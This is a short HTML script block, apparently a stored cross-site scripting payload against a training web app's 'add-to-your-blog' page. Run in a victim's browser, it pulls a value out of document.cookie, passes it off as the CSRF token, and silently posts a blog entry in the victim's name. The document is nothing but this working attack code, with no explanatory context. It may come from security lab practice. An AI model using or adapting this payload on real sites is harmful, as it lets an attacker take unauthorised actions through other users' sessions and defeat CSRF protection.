
<script>
        var http = new XMLHttpRequest();
	var url= "add-to-your-blog-php-submit-button=Save+Blog+Entry";
	url = url.concat("&blog_entry=SaidVirus!");
	url = url.concat("&csrf-token=");
	url = url.concat(document.cookie.split(";")[3]);


	http.open("POST", "index.php?page=add-to-your-blog.php", true);
	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	http.setRequestHeader("Content-length", url.length);
	http.send(url);
</script>
